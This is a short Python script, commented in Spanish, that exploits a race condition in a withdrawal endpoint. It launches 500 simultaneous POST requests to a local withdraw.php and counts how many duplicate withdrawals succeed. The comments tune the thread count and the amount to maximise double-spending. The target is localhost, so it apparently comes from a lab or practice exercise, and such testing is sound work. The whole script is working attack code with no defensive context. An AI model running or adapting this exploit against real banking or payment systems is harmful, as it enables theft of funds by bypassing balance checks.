import threading
import requests

# URL del endpoint de retiro
url = "http://127.0.0.1/withdraw.php"

# Datos de la cuenta y la cantidad a retirar
account_id = 1
amount = 100.0  # Reducir la cantidad para aumentar la probabilidad de múltiples éxitos

# Número de solicitudes concurrentes
num_threads = 500  # Aumentar el número de hilos

# Contador de retiros exitosos
success_count = 0
success_lock = threading.Lock()

# Función que realiza una solicitud de retiro
def withdraw_money():
    global success_count
    data = {
        'account_id': account_id,
        'amount': amount,
        'transaction_type': 'withdrawal'
    }
    try:
        response = requests.post(url, data=data)
        # Imprimir la respuesta de cada solicitud
        print(response.text)
        if "Withdrawal successful" in response.text:
            with success_lock:
                success_count += 1
    except Exception as e:
        print(f"Error: {e}")

# Crear y ejecutar hilos
threads = []
for i in range(num_threads):
    t = threading.Thread(target=withdraw_money)
    threads.append(t)
    t.start()

# Esperar a que todos los hilos terminen
for t in threads:
    t.join()

print(f"Finished all requests. Successful withdrawals: {success_count}")
